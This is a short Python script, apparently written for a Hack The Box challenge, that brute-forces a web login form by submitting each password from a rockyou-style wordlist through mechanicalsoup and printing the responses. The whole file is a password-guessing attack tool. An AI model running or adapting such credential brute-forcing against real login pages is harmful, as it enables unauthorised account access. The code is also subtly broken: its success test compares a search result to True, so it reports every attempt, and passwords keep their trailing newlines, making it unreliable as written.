import requests 
import mechanicalsoup



#func 
#for loop that sends req for each inside rockyou.txt
def cracker():
    rock = open('rock.txt')
    for i in rock:
        browser=mechanicalsoup.StatefulBrowser()
        page = browser.open('http://docker.hackthebox.eu:31755')
        print(page.text)
        browser.get_current_page()
        browser.select_form('form[method="POST"]')
        browser["password"] = i
        browser.submit_selected()
        pageSub = browser.get_current_page()
        search = pageSub.find('body', 'Invalid password!')
        if search != True:
            print(pageSub)
cracker()            